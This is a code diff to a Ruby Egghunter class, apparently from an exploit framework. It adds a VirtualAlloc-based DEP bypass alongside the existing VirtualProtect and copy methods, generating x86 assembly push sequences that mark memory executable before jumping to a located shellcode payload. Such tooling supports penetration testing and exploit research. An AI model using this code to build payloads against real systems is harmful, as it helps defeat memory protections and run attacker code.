@@ -58,29 +58,34 @@ class Egghunter
 				end
 				startstub << "\n\t" if startstub.length > 0
 
-				getpointer = ''
-				getsize = ''
-				getpc = ''
-				jmppayload = "jmp edi"
+				getpointer   = ''
+				getsize      = ''
+				getalloctype = ''
+				getpc        = ''				
+				jmppayload   = "jmp edi"	
 
-				apireg = (opts[:depreg] || 'esi').downcase
+				apireg = opts[:depreg] || 'esi'
 				apidest = opts[:depdest]
 				depsize = opts[:depsize]
-
+				
 				freeregs = [ "esi", "ebp", "ecx", "ebx" ]
-
+				
 				reginfo = {
 					"ebx"=>["bx","bl","bh"],
 					"ecx"=>["cx","cl","ch"]
 				}
 
 				if opts[:depmethod]
-
+				
 					if freeregs.index(apireg) == nil
 						getpointer << "mov #{freeregs[0]},#{apireg}\n\t"
 						apireg = freeregs[0]
 					end
 					freeregs.delete(apireg)
+					
+					if opts[:depmethod].downcase == "virtualalloc"
+						depsize = 0xfff
+					end
 
 					if opts[:depmethod].downcase == "copy" || opts[:depmethod].downcase == "copy_size"
 						if apidest
@@ -94,7 +99,7 @@ class Egghunter
 						end
 						freeregs.delete(apidest)
 					end
-
+					
 
 					sizereg = freeregs[0]
 
@@ -123,13 +128,11 @@ class Egghunter
 							elsif high != "00"
 								getsize << "mov #{regvars[2]},0x%s\n\t" % high
 							end
-							getsize << "push #{sizereg}\n\t"
 						end
 						if sizereg == "ebp"
 							if low != "00" and high != "00"
 								getsize << "xor #{sizereg},#{sizereg}\n\t"
 								getsize << "mov bp,0x%s\n\t" % sizebytes
-								getsize << "push #{sizereg}\n\t"
 							end
 						end
 						# last resort
@@ -153,15 +156,26 @@ class Egghunter
 							if delta > 0
 								getsize << "add #{sizereg},0x%02x\n\t" % delta
 							end
-							getsize << "push #{sizereg}\n\t"
 						end
+						if opts[:depmethod].downcase == "virtualalloc"
+							getsize << "inc #{sizereg}\n\t"
+						end
+						
+						getsize << "push #{sizereg}\n\t"
+						
 					end
-				
+					
+					getalloctype = getsize
 
 					case opts[:depmethod].downcase
 						when "virtualprotect"
 							jmppayload = "push esp\n\tpush 0x40\n\t"
 							jmppayload << getsize
+							jmppayload << "push edi\n\tpush edi\n\tpush #{apireg}\n\tret"
+						when "virtualalloc"
+							jmppayload = "push 0x40\n\t"
+							jmppayload << getalloctype
+							jmppayload << "push 0x01\n\t"
 							jmppayload << "push edi\n\tpush edi\n\tpush #{apireg}\n\tret"
 						when "copy"
 							jmppayload = getpc
